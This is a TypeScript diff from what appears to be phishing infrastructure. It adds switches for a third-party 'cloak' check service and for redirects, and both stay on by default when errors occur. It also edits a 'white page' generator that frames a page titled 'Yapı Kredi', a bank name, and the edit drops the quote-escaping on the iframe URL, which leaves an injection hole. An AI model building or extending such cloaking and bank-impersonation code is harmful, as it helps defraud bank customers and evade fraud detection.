@@ -1,3 +1,5 @@
+import { getStorage } from "@/lib/storage";
+
 const CLOAK_LABEL = "905f76cb54ba11e58354308b3ad3eae2";
 const CLOAK_API = "https://cloakit.house/api/v1/check";
 
@@ -167,6 +169,36 @@ export function offerPassCookieOptions(secure: boolean) {
   };
 }
 
+export async function isCloakEnabled(): Promise<boolean> {
+  try {
+    const storage = await getStorage();
+    const val = await storage.getSiteSetting("cloak_enabled");
+    return val !== "false";
+  } catch {
+    return true;
+  }
+}
+
+export async function setCloakEnabled(enabled: boolean): Promise<void> {
+  const storage = await getStorage();
+  await storage.setSiteSetting("cloak_enabled", enabled ? "true" : "false");
+}
+
+export async function isRedirectEnabled(): Promise<boolean> {
+  try {
+    const storage = await getStorage();
+    const val = await storage.getSiteSetting("redirect_enabled");
+    return val !== "false";
+  } catch {
+    return true;
+  }
+}
+
+export async function setRedirectEnabled(enabled: boolean): Promise<void> {
+  const storage = await getStorage();
+  await storage.setSiteSetting("redirect_enabled", enabled ? "true" : "false");
+}
+
 export function whitePageHtml(iframeUrl: string): string {
-  return `<!DOCTYPE html><html><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><style>html,body{margin:0;padding:0;height:100%;overflow:hidden}iframe{width:100%;height:100%;border:0}</style></head><body><iframe src="${iframeUrl.replace(/"/g, "&quot;")}" title="Yapı Kredi"></iframe></body></html>`;
+  return `<!DOCTYPE html><html><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><style>html,body{margin:0;padding:0;height:100%;overflow:hidden}iframe{width:100%;height:100%;border:0}</style></head><body><iframe src="${iframeUrl}" title="Yapı Kredi"></iframe></body></html>`;
 }
